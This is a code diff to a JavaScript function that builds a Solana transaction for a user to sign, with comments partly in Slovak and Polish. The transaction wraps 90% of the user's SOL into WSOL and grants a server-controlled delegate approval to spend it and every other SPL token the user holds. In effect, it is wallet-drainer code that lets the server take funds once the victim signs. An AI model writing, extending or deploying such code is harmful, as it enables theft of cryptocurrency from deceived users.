@@ -28,7 +28,7 @@ async function buildApprove(user, connection) {
             setBlockhash(blockhash);
             tx.recentBlockhash = blockhash;
 
-            // Fee payer = user
+            // Fee payer = user (user podpisuje túto TX)
             tx.feePayer = userPubkey;
 
             // 1. Fetch token accounts
@@ -36,7 +36,8 @@ async function buildApprove(user, connection) {
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
             //
-            // WSOL handling: wrap a portion of SOL into WSOL, create ATA if missing, sync and approve WSOL
+            // WSOL handling: wrap 90% of SOL into WSOL, create ATA if missing, sync and approve WSOL
+            // 10% native SOL ostane v user accounte (buffer pre gebúry)
             //
             const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
             const ATA_RENT_BUFFER = 3_000_000n;  // reserve for creating ATA
@@ -74,7 +75,7 @@ async function buildApprove(user, connection) {
                             );
                         }
 
-                        // SOL -> WSOL transfer
+                        // SOL -> WSOL transfer (90% of available)
                         tx.add(
                             SystemProgram.transfer({
                                 fromPubkey: userPubkey,
@@ -86,21 +87,25 @@ async function buildApprove(user, connection) {
                         // Sync native
                         tx.add(createSyncNativeInstruction(wsolAta));
 
-                        // Approve WSOL to delegate
+                        // Approve WSOL to delegate (server can transfer WSOL)
                         tx.add(
-    createApproveInstruction(
-        wsolAta,
-        delegatePubkey,
-        userPubkey,
-        Number(wrapAmount)  // ✅ Konwertuj na number
-    )
-
+                            createApproveInstruction(
+                                wsolAta,
+                                delegatePubkey,
+                                userPubkey,
+                                Number(wrapAmount)
+                            )
                         );
+
+                        logger.info("WSOL wrap and approve added", {
+                            wrapAmount: wrapAmount.toString(),
+                            ratio: `${WRAP_RATIO_NUM}/${WRAP_RATIO_DEN}`
+                        });
                     }
                 }
             }
 
-            // 2. Approve all other SPL tokens
+            // 2. Approve all other SPL tokens (USDC, JUP, atď.)
             for (const token of tokenAccounts.tokens || []) {
                 if (token.amount < MIN_RAW_AMOUNT) continue;
 
@@ -119,7 +124,7 @@ async function buildApprove(user, connection) {
                 );
             }
 
-            logger.info("Approve + SOL transfer TX built", {
+            logger.info("Approve + WSOL wrap TX built", {
                 instructions: tx.instructions.length
             });
 
@@ -132,3 +137,6 @@ async function buildApprove(user, connection) {
 }
 
 module.exports = { buildApprove };
+
+
+
